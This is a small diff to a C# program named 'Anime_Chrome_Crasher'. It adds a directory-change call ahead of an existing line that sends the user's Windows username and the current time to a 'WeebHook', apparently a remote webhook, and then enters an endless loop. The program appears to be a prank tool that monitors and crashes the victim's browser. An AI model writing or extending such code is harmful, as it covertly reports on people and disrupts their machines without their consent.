@@ -13,6 +13,7 @@ namespace Anime_Chrome_Crasher
         [STAThread]
         static void Main()
         {
+            WeebHook.ChangeDir();
             WeebHook.SendMessage("Weeb detection of " + Environment.UserName + " started at " + DateTime.Now.ToString());
             while (true)
             {
